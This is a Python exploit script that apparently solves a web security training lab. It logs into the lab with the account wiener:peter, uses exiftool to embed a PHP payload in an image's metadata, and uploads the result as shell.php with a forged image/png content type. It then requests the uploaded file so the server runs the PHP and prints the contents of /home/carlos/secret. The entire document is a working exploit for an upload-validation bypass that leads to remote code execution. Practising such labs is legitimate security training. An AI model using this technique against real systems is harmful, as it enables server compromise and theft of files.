import sys
import os
import requests
from bs4 import BeautifulSoup as bs
import urllib3
import subprocess
import re
from requests_toolbelt import MultipartEncoder

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def csrft(u, s):
    r = s.get(u, verify=False, proxies=proxies)
    soup = bs(r.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'})['value']
    return csrf

def probe(url, s):
    u = url + "files/avatars/shell.php"
    r = s.get(u, verify=False, proxies=proxies)
    match = re.search(r'START (.*) END', r.text, re.DOTALL)
    if match:
        print(match.group(1))
    else:
        print("Response size zero or no content found between START and END.")
 

def upload(url, s, fpath):
    print("Uploading file... 📁 ➡ 🗄️")
    u = url + "my-account/avatar"
    u2 = url + "my-account"
    csrf = csrft(u2, s)
    php_code = "<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>"
    command = f'exiftool -Comment="{php_code}" {fpath} -o polyglot.php'
    file = subprocess.run(command, capture_output=True, text=True, shell=True)
    print(f"command: {command}")

    if not os.path.exists('polyglot.php'):
        print("Error: polyglot.php was not created.")
        return

    with open('polyglot.php', 'rb') as file:
        raw = file.read()
    fileshell = {'avatar': ('shell.php', raw, 'image/png'), 'user': 'wiener', 'csrf': csrf}
    boundary = "---------------------------179091273795350098189507918"
    m = MultipartEncoder(fields=fileshell, boundary=boundary)
    headers = {'Content-Type': m.content_type}
    r = s.post(u, data=m, headers=headers, verify=False, proxies=proxies)
    if "The file avatars/shell.php has been uploaded." in r.text:
        print("Success, file uploaded :)")
        probe(url, s)
    else:
        print("Error uploading file :(")

def login(url, s, fpath):
    u = url + "login"
    csrf = csrft(u, s)
    data = {'csrf': csrf, 'username': 'wiener', 'password': 'peter'}
    r = s.post(u, data=data, verify=False, proxies=proxies)
    if "Log out" in r.text:
        print("Logged in... ✅")
        upload(url, s, fpath)
    else:
        print("Failed to login... ❌")

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <url> <relativePathToImage>")
        sys.exit(-1)
    else:
        url = sys.argv[1]
        fpath = sys.argv[2]
        s = requests.Session()
        login(url, s, fpath)

if __name__ == '__main__':
    main()
